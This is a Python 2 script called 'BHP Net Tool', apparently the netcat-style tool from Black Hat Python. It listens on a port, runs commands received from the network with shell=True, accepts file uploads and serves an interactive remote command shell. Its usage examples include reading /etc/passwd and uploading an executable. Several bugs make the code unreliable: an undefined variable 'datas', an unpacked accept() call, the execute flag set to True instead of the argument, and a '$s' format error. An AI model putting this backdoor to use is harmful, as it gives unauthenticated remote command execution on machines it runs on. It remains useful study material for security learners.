#coding=utf-8
import sys
import socket
import getopt
import threading
import subprocess

#定义全局变量

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


#help

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host - p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run -execute the given file upon receiving a connection"
    print "-c --command             - initialize a commandshell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | python ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)



def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer) > 0:
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += datas

                if recv_len < 4096:
                    break

            print response

            buffer = raw_input()
            buffer += "\n"

            client.send(buffer)

    except:
        print "[*] Exception! Exiting."

        client.close()
def run_command(command):

    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "[*] Failed to execute command.\r\n"

    return output


def client_handler(client_socket):

    global upload
    global execute
    global command
    global upload_destination

    if len(upload_destination):

        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("[*] Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("[*] Failed to save file to $s\r\n" % upload_destination)


    if len(execute):

        output = run_command(execute)

        client_socket.send(output)


    if command:

        while True:

            client_socket.send("<BHP:#> ")

            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)


            response = run_command(cmd_buffer)

            client_socket.send(response)


def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket = server.accept()

        client_threading = threading.Thread(target=client_handler, args=(client_socket,))

        client_threading.start()

def do_main():
    global listen
    global command
    global upload
    global execute
    global target
    global upload_destination
    global port

    #无输入参数，执行帮助
    if not len(sys.argv[1:]):
        usage()

    #读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload", "test"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = True
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("--test"):
            print "it ok!"
        else:
            assert False, "Invalid argument!"

    if not listen and len(target) and port > 0:

        buffer = sys.stdin.read()

        client_sender(buffer)


    if listen:
        server_loop()



if __name__ == '__main__':
    do_main()